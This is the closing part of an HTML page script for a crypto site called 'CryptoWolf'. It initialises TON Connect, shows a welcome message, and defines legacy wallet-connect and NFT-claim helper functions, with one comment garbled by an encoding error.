            initTonConnect();
            showStatus('Welcome to CryptoWolf! Connect your wallet to start.', 'info');
        });

        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
        window.didtrans = function() {
            console.log('Legacy didtrans called');
            claimNFT();
        };

        window.connectWallet = function() {
            console.log('Legacy connectWallet called');
            if (tonConnectUI) {
                if (!tonConnectUI.connected) {
                    tonConnectUI.openModal();
                }
            }
        };
    </script>
</body>

</html>








